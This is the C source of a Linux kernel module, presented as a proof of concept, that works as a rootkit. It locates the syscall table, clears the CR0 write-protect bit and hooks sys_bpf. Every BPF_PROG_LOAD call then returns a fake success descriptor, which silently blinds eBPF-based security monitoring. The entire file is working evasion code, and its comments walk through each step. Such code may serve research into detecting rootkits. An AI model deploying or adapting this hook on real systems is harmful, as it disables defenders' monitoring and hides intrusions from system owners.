#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/bpf.h>
#include <asm/paravirt.h>

// Module Information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yotam Dvir");
MODULE_DESCRIPTION("PoC: Blinding eBPF via Syscall Table Hooking");

// ---------------------------------------------------------------------------
// Global Variables
// ---------------------------------------------------------------------------

// Pointer to the system call table
unsigned long *sys_call_table;

// Pointer to save the original function (so we can restore it later)
asmlinkage long (*original_sys_bpf)(int cmd, union bpf_attr __user *uattr, unsigned int size);


// ---------------------------------------------------------------------------
// Part 2: Writing the Syscall handler function (The Hook)
// This is the function that will replace the original sys_bpf
// ---------------------------------------------------------------------------
asmlinkage long hook_sys_bpf(int cmd, union bpf_attr __user *uattr, unsigned int size)
{
    // Check: Is the command loading a program (BPF_PROG_LOAD)?
    if (cmd == BPF_PROG_LOAD) {
        // Report to system log (proof that the hook worked)
        printk(KERN_ALERT "[Rootkit] Intercepted BPF_PROG_LOAD! Blocking execution.\n");

        // Return "Fake Success" (Fake File Descriptor)
        // The number 4 is arbitrary, but looks valid to security tools
        return 4;
    }

    // For any other command (like creating maps), pass to the original handler
    // This prevents a general system crash
    return original_sys_bpf(cmd, uattr, size);
}


// ---------------------------------------------------------------------------
// Part 3: Adding write permissions to the table and modifying it (CR0 Manipulation)
// This action is required because the table is in read-only memory
// ---------------------------------------------------------------------------

// Function to disable Write Protection (WP)
static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0); // Bit 16 is the protection bit
    write_cr0(cr0);
}

// Function to restore Write Protection (very important for stability!)
static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}


// ---------------------------------------------------------------------------
// Part 4: Integration into a program (Init & Exit)
// Module initialization and exit functions
// ---------------------------------------------------------------------------

// The function that runs when loading the module (insmod)
static int __init my_rootkit_init(void)
{
    printk(KERN_INFO "[Rootkit] Loading module...\n");

    // 1. Locating the Syscall pointer table
    // (Assumption: The function is available in this kernel)
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    if (!sys_call_table) {
        printk(KERN_ERR "[Rootkit] Failed to find sys_call_table address.\n");
        return -EFAULT;
    }

    printk(KERN_INFO "[Rootkit] Found sys_call_table at %p\n", sys_call_table);

    // 2. Saving the original address of sys_bpf
    // __NR_bpf is the index of bpf in the table (usually 321 on x64)
    original_sys_bpf = (void *)sys_call_table[__NR_bpf];

    // 3. Executing the Hooking
    disable_write_protection(); // Disable CPU protections
    sys_call_table[__NR_bpf] = (unsigned long)hook_sys_bpf; // Change the pointer
    enable_write_protection();  // Restore CPU protections

    printk(KERN_INFO "[Rootkit] Hook installed. eBPF is now blind.\n");
    return 0;
}

// The function that runs when removing the module (rmmod)
static void __exit my_rootkit_exit(void)
{
    if (sys_call_table && original_sys_bpf) {
        disable_write_protection();
        sys_call_table[__NR_bpf] = (unsigned long)original_sys_bpf; // Restore original
        enable_write_protection();
        printk(KERN_INFO "[Rootkit] Hook removed. Original BPF restored.\n");
    }
}

// Register functions to the kernel
module_init(my_rootkit_init);
module_exit(my_rootkit_exit);